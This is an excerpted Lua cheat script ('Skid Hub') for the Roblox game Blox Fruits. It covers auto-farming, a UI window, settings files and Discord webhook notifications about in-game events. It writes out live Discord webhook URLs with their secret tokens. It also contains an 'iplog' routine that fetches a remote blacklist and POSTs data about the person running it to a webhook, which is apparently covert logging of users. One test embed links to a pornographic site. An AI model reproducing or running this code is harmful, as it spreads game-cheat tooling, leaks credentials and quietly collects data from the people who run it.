    ...
    function()
        while task.wait() do
            if h["CuttayV4"] then
                ...
                h["Tween Speed"] = 300
                if LocalPlayerLevelValue < 2550 then
...
concacsss = Skid and "Skid" or "YMF"
local A =
    z:MakeWindow(
    {
        Name = "Blox Fruit (Skid Hub)",
        IntroEnabled = false,
        IntroText = "Skid Hub Library",
...
local ai = {
    ...
    ["Isle Outlaw [Lv. 2450]"] = true,
    ["Island Boy [Lv. 2475]"] = true,
    ["Sun-kissed Warrio [Lv. 2500]"] = true,
    ["Isle Champion [Lv. 2525]"] = true
}
...
function FastAttackConnectorFunction()
    ...
    local d =
        b(
        {
            Url = "https://discord.com/api/webhooks/1200434284889128970/vlAzGnynQkZo9P9I4ihFb8eAcxl8g0X_9n3oZAcHqB6zsav5ndTPWBm2p9wjYecqR5w_"
        }
    )
...
function SaveSettings2()
    ...
    writefile("Skid Hub/" .. bN, HttpService:JSONEncode(bM))
end
function ReadSetting2()
    local s, o =
        ...
        function()
            ...
            return HttpService:JSONDecode(readfile("Skid Hub/" .. bN))
        end
    )
    if s then
        return o
...
function GetMsg()
    ...
    k3 = {}
    if h["PingEveryone"] and h["WebhookWhenMirage"] then
        k3["content"] = "vai ca dai co mirage"
    else
        k3["content"] = "toi nwngs"
    end
    k3["embeds"] = {
...
function GetMsgTest()
    k3 = {}
    k3["embeds"] = {{["title"] = "huh?-co fullmoon", ["url"] = "https://www.pornhub.com", ["description"] = "Ok"}}
    return k3
end
spawn(
    function()
...
spawn(
    function()
        ...
        if game:GetService("Workspace").Map:FindFirstChild("MysticIsland") then
            PostWebhook(
                "https://discord.com/api/webhooks/1200056621930381363/wNUWGVb2K587L8EHFpQ5fi3EJ35gidyquYfc78A8t3O1tV8sZEiXMAIbGkpU-bHcSk0t",
                GetMsg2()
            )
        end
    end
...
spawn(
    function()
        ...
        if CheckMoon() == "Full Moon" or CheckMoon() == "Next Night" then
            PostWebhook(
                "https://discord.com/api/webhooks/1200056724258836581/PvYnW9HB5qPJl7I9aBMUgnl4_RxliFSMBKhxLYEKgolUsIF2QQGQvee4IB_gHWpbGtw7",
                GetMsg2()
            )
        end
    end
...
spawn(
    function()
        function iplog()
            ...
            local cF =
                game:HttpGet("https://raw.githubusercontent.com/Skidgaylord/blacklist-skidhub/main/memaybeo")
            descriptionf = ""
            ...
            local cp =
                co(
                {
                    Url = "https://discord.com/api/webhooks/1200057252850180126/OFNYfpo0Oy3S8eOatOpWR8Xk-azdtdFoeWtU4sJXMwDvSRGhatwI2rgyfQQtgecBffuB",
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
